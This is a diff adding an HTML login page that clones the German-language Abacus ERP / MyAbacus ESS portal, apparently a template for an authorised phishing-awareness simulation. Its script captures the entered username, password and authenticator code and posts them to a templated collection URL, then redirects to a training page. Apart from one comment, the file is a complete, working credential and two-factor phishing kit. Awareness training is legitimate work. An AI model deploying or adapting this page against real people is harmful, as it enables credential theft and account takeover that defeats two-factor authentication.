@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Abacus ERP</title>
+  <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+  <div class="login-container">
+
+    <div class="login-head">
+      <h3 class="login-title">Abacus ERP Login</h3>
+      <img class="login-logo" alt="ABACUS"
+           src="data:image/png;base64,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">
+    </div>
+
+    <div class="hpanel">
+      <div class="panel-body">
+
+        <h5 class="login-please">Bitte anmelden für MyAbacus ESS</h5>
+
+        <form method="post" action="{{POST_URL}}" id="step-login" autocomplete="off">
+          <div class="form-group">
+            <label class="control-label" for="username">Benutzername</label>
+            <input type="text" name="email" id="username" class="form-control"
+                   autocomplete="username" spellcheck="false" autocapitalize="none"
+                   title="Bitte geben Sie Ihren Benutzernamen ein">
+          </div>
+          <div class="form-group">
+            <label class="control-label" for="password">Passwort</label>
+            <input type="password" name="password" id="password" class="form-control"
+                   title="Bitte geben Sie Ihr Passwort ein">
+          </div>
+          <div class="form-actions">
+            <button type="submit" class="btn btn-primary">Anmelden</button>
+          </div>
+        </form>
+
+        <form method="post" action="{{POST_URL}}" id="step-2fa" style="display:none" autocomplete="off">
+          <h5 class="login-please">Code eingeben</h5>
+          <p class="otp-hint">Geben Sie den Bestätigungscode aus Ihrer Authenticator-App
+             für <span id="email-echo-2"></span> ein.</p>
+          <div class="form-group">
+            <label class="control-label" for="code_2fa">Bestätigungscode</label>
+            <input type="text" name="code_2fa" id="code_2fa" class="form-control"
+                   inputmode="numeric" autocomplete="one-time-code"
+                   spellcheck="false" autocapitalize="none"
+                   title="Bitte geben Sie Ihren Bestätigungscode ein">
+          </div>
+          <div class="form-actions">
+            <button type="submit" class="btn btn-primary">Bestätigen</button>
+          </div>
+        </form>
+
+      </div>
+    </div>
+
+    <div class="language-bar">
+      <div class="bar-left">
+        <a class="bar-link" href="#">
+          <img class="bar-icon" alt=""
+               src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIGlkPSJFYmVuZV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NC4yMzMgNDcuNDEyIj48ZGVmcz48c3R5bGU+LmNscy0xe2ZpbGw6bm9uZTtzdHJva2U6IzdiN2I3YjtzdHJva2UtbGluZWpvaW46cm91bmQ7c3Ryb2tlLXdpZHRoOjEuNXB4O30uY2xzLTJ7ZmlsbDojZTAyYzM5O3N0cm9rZS13aWR0aDowcHg7fTwvc3R5bGU+PC9kZWZzPjxnIGlkPSJJY29uIj48cGF0aCBpZD0iUGF0aCIgY2xhc3M9ImNscy0xIiBkPSJNMjAuNzY3LDM3LjM1MkgzLjU5N2MtMS41NjEsMC0yLjgxLTEuMjQ5LTIuODEtMi44MVYxNC4yNTFMMTYuMzk2LDEuNDUyYy45MzctLjkzNywyLjQ5Ny0uOTM3LDMuNzQ2LDBsMTUuNjA5LDEyLjc5OXY5Ljk4OSIvPjxwYXRoIGlkPSJQYXRoLTIiIGNsYXNzPSJjbHMtMSIgZD0iTS40NzYsMzUuNzkxbDE1LjYwOS0xMi43OTljLjkzNy0uOTM3LDIuNDk3LS45MzcsMy43NDYsMCwzLjEyMiwyLjQ5Nyw0Ljk5NSw0LjA1OCw1LjYxOSw0LjY4MyIvPjxsaW5lIGlkPSJQYXRoLTMiIGNsYXNzPSJjbHMtMSIgeDE9Ii40NzYiIHkxPSIxMy42MjciIHgyPSIxMy44OTkiIHkyPSIyNC41NTMiLz48cGF0aCBpZD0iUGF0aC00IiBjbGFzcz0iY2xzLTEiIGQ9Ik0yMi4wMTUsMjQuNTUzYzIuODEtMi40OTcsNy4xOC02LjI0MywxMy4xMTEtMTAuOTI2Ii8+PHBhdGggY2xhc3M9ImNscy0yIiBkPSJNNDMuNTAyLDMyLjM5OGMtLjQ4OC0xLjIzLTEuMTg2LTIuMzItMi4wNzYtMy4yMzktLjg4Ny0uOTE2LTEuOTU0LTEuNjU0LTMuMTc3LTIuMTkycy0yLjU4Mi0uODExLTQuMDQ1LS44MTEtMi44NTYuMjgyLTQuMTQzLjgzOC0yLjQyMSwxLjMyMi0zLjM3MiwyLjI3NGMtLjk1NC45NTMtMS43MjIsMi4wODgtMi4yNzcsMy4zNzZzLS44MzUsMi42ODMtLjgzNSw0LjE0MS4yOCwyLjg1My44MzUsNC4xNDFjLjU1OCwxLjI5MSwxLjMyNiwyLjQyNywyLjI3NCwzLjM3NXMyLjA4NSwxLjcxNiwzLjM3OCwyLjI3NmMxLjI5LjU1MywyLjY4My44MzQsNC4xNC44MzQsMS4yMzgsMCwyLjM0Ny0uMTQ2LDMuMjk5LS40MzkuOTYtLjI5OSwxLjcyMi0uNjA0LDIuMzIzLS45MzRsLjI1Ni0uMTQtLjc0NC0xLjYyMi0uMjkzLjE1OWMtLjQ2OS4yNTItMS4xMjguNTEyLTEuOTU3Ljc3Ni0uODE0LjI1NS0xLjc4My4zODQtMi44ODQuMzg0LTEuMjQxLDAtMi40MDgtLjIzMi0zLjQ2Ni0uNjg3LTEuMDYxLS40NTctMS45OTQtMS4wOTMtMi43OC0xLjg4Ny0uNzktLjc5Ny0xLjQxNS0xLjc0MS0xLjg2LTIuODA2LS40NDUtMS4wNjctLjY3NC0yLjIyMS0uNjc0LTMuNDI4LDAtMS4yMjcuMjI5LTIuMzg1LjY3NC0zLjQ0My40NDUtMS4wNTUsMS4wNy0xLjk5NSwxLjg2LTIuNzk0Ljc4My0uNzkzLDEuNzE5LTEuNDI3LDIuNzc3LTEuODg2LDEuMDYxLS40NTYsMi4yMjgtLjY4NiwzLjQ2OS0uNjg2LDEuMjIyLDAsMi4zNS4yMjEsMy4zNTMuNjU4LDEuMDAzLjQzNiwxLjg2OSwxLjA0MSwyLjU3NiwxLjc5NC43MS43NTUsMS4yNjgsMS42NTEsMS42NjEsMi42NjQuMzksMS4wMTQuNTkxLDIuMTEzLjU5MSwzLjI2NSwwLDEuMDY1LS4wOTEsMS45MjQtLjI3MSwyLjU0Ni0uMTgzLjYxOS0uNDAyLDEuMDg0LS42NTUsMS4zODYtLjI0NC4yOTQtLjUwNi40ODgtLjc3Ny41NzItLjMwMi4wOTUtLjU4Mi4xNDItLjgzNS4xNDItLjI4NCwwLS42NTgtLjA0My0uODI5LS4yNDctLjE0OS0uMTc0LS4yMjYtLjQxNi0uMjI2LS43MjF2LTQuNjQ2YzAtMS4zMzctLjQzMy0yLjQzLTEuMjk2LTMuMjUxLS44NTQtLjgxMi0yLjAzOS0xLjIyNC0zLjUyMS0xLjIyNC0uNTczLDAtMS4xMTMuMDY3LTEuNjA0LjE5Ny0uNDc5LjEyNy0uOTEyLjI3MS0xLjI3Ny40MjUtLjQxNS4xNjktLjgwOC4zNjEtMS4yMDcuNTg4bC0uMjY4LjE1Mi45MTIsMS42NDYuMjgtLjE3OGMuMjgtLjE3OC41OTEtLjM0NC45MjEtLjQ5Mi4zMDgtLjEzMS42NDktLjI1MiwxLjAyMS0uMzU1LjY5NS0uMjAzLDEuNTctLjIwOSwyLjM0Ny0uMDI3LjM1Ny4wODcuNjYyLjIzOS45MjcuNDYzLjI2Mi4yMTkuNDc5LjUyNi42NC45MTIuMTYyLjM4MS4yNDcuODgxLjI0NywxLjQ4NnYuMjI5Yy0uMTY1LS4xMDctLjMzNS0uMjA5LS41MTgtLjMwOS0uMzA1LS4xNTQtLjY3NC0uMjk5LTEuMTI4LS40NDUtLjk5NC0uMzE2LTIuMTU4LS4yNy0zLjE4LjA0MS0uNTYxLjE3MS0xLjA2MS40MjItMS40OTQuNzQ4LS40MzMuMzI5LS43OC43NDItMS4wNCwxLjIyNy0uMjYyLjQ5Mi0uMzkzLDEuMDU1LS4zOTMsMS42NzQsMCwuNjc3LjE0MywxLjI3MS40MjcsMS43NjcuMjg0LjQ4OC42NC44OTYsMS4wNjQsMS4yMTYuNDI3LjMyNS45MDUuNTY3LDEuNDI3LjcyMSwxLjE4LjM0OSwyLjMzMi4yODIsMy4yNTYtLjA5Ni41MTUtLjIxMy45MzYtLjQ0NywxLjI3Ny0uNzA5LjIyNi0uMTY2LjQzMy0uMzQ5LjYyMi0uNTQzLjE3MS40OTEuNDYzLjg2MS44NzIsMS4xMDUuNTMzLjMxMSwxLjA5MS40NjksMS42NTUuNDY5LjM5OSwwLC44NDEtLjA3NSwxLjM1Ny0uMjI3LjUzNy0uMTU5LDEuMDQzLS40NzMsMS41LS45MzQuNDYzLS40NjIuODUxLTEuMTIyLDEuMTU1LTEuOTY1LjMwOC0uODM1LjQ2LTEuOTYuNDYtMy4zNDEsMC0xLjQwMS0uMjQ0LTIuNzMzLS43MzItMy45NjJaTTM2LjkxNCwzNy45NTF2MS4yMjZjLS4yMDQuMzI2LS40NTEuNjI1LS43MzUuODk1LS4yNDQuMjQyLS41NjEuNDYyLS45NDUuNjUyLS4zNzIuMTg2LS44MTQuMjgtMS4zMTQuMjgtLjk3OSwwLTEuNzE2LS4yMTItMi4xODktLjYzLS40NjMtLjQxOC0uNjkyLS45MDEtLjY5Mi0xLjQ3OSwwLS4yMzMuMDQ5LS40NjYuMTQ5LS43MTMuMDk1LS4yMzYuMjUzLS40NTQuNDczLS42NTEuMjI2LS4yLjUyNy0uMzcyLjg5OS0uNTExcy44MzgtLjIwOSwxLjM4Ny0uMjA5Yy40NTEsMCwuODcyLjA2NiwxLjI1LjE5NS4zOTkuMTQuNzM1LjI4Mi45ODIuNDE1LjI3MS4xNjYuNTE4LjM0NC43MzUuNTI5WiIvPjwvZz48L3N2Zz4=">
+          <span>Check Newsletter</span>
+        </a>
+        <a class="bar-link" href="#">
+          <img class="bar-icon" alt=""
+               src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0My45NCA0Ny41NiI+PGRlZnM+PHN0eWxlPi5jbHMtMSwuY2xzLTJ7ZmlsbDpub25lO3N0cm9rZS13aWR0aDoxLjVweDt9LmNscy0xe3N0cm9rZTojN2I3YjdiO30uY2xzLTJ7c3Ryb2tlOiNkZTMyM2M7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5BQkFDX0ljb25fRmlyc3RfTGV2ZWxfU3VwcG9ydF8xPC90aXRsZT48ZyBpZD0iRWJlbmVfMiIgZGF0YS1uYW1lPSJFYmVuZSAyIj48ZyBpZD0iRWJlbmVfMS0yIiBkYXRhLW5hbWU9IkViZW5lIDEiPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTM1LjEzLDE5VjEzLjE5YzAtNi02LTEyLjQ0LTEzLjY3LTEyLjQ0UzcuOCw3LjIyLDcuOCwxMy4xOXYyLjc1bTIzLjI4LDR2Mi4wN2E5LjQ1LDkuNDUsMCwwLDEtNCw4TTE1LjksNi44MkMxNS45LDEyLjUsMjcuMzgsMjAsMzMuMTEsMjAiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0xNS45LDExLjg5Yy0yLjQ0LDEtNS4wNiwzLjY5LTUuMDYsNy4wOHYzYzAsMy41NiwyLjY0LDcuMTIsNi43Niw5TTI1LDM0LjE2YTIsMiwwLDAsMS0yLDJIMjJhMiwyLDAsMCwxLDAtNGgxYTIsMiwwLDAsMSwyLDJaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMjQsMzQuMTZoMWM1LjU4LDAsMTAuMDgtMy44NywxMC4wOC05LjE3bTItOWgtMnY5LjExaDJhMiwyLDAsMCwwLDItMlYxOGEyLDIsMCwwLDAtMi0yWm0tMzEuMzgsMGgydjkuMTFoLTJhMiwyLDAsMCwxLTItMlYxOGEyLDIsMCwwLDEsMi0yWk0xNC44OSwyOS4xdjguMSIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTE0Ljg4LDM2LjE4LDIyLDQzLjI3bC0zLDMtNy4wOC03LjA5Wm0xNC4xOCwwTDIyLDQzLjI3bDMsMyw3LjA5LTcuMDlabS0xNy4yMSwzTDYuMDksNDAuNWE2LjA3LDYuMDcsMCwwLDAtNC40NCw0TC43MSw0Ny4zMm0zMS4zOS04LjEsNS43NSwxLjI4YTYsNiwwLDAsMSw0LjQ0LDRsLjk0LDIuODEiLz48L2c+PC9nPjwvc3ZnPg==">
+          <span>Hilfe</span>
+        </a>
+      </div>
+      <div class="bar-right">
+        <button type="button" class="btn btn-default dropup-btn">Deutsch <span class="caret"></span></button>
+      </div>
+    </div>
+
+  </div>
+
+<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
+<script>
+(function () {
+  // CAPTURE (authorised simulation): single-page login (username + password on
+  // one screen, matching the real portal). On submit it records page 1 (email)
+  // then page 2 (email+password) to the tracker — keeping the 3-page tracker
+  // schema — then either shows the OTP step (page 3) or redirects to the
+  // built-in awareness page (learn.html). URL params: rid/trackerId (tracker
+  // context), email|login_hint (pre-fills the username), mfa=0 (skip OTP).
+  var POST_URL = "{{POST_URL}}";
+  var Q = new URLSearchParams(location.search);
+  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
+  var captureMfa   = Q.get("mfa") !== "0";
+  function trackerCtx() {
+    var t = window.__taphish_tracker || {};
+    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
+  }
+  function post(payload, cb) {
+    if (!POST_URL) { cb(); return; }
+    fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
+  }
+  var formLogin = document.getElementById("step-login");
+  var form2fa   = document.getElementById("step-2fa");
+  var emailVal = "", pwdVal = "";
+  function redirectAware(ctx) {
+    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
+    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
+  }
+  formLogin.addEventListener("submit", function (e) {
+    e.preventDefault();
+    emailVal = formLogin.elements["email"].value;
+    pwdVal   = formLogin.elements["password"].value;
+    var ctx = trackerCtx();
+    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
+      post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
+        if (captureMfa && form2fa) {
+          formLogin.style.display = "none"; form2fa.style.display = "block";
+          var ee = document.getElementById("email-echo-2"); if (ee) ee.textContent = emailVal;
+        } else { redirectAware(ctx); }
+      });
+    });
+  });
+  if (form2fa) {
+    form2fa.addEventListener("submit", function (e) {
+      e.preventDefault();
+      var code = form2fa.elements["code_2fa"].value;
+      var ctx = trackerCtx();
+      post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
+    });
+  }
+  if (prefillEmail && formLogin.elements["email"]) { formLogin.elements["email"].value = prefillEmail; }
+})();
+</script>
+</body>
+</html>
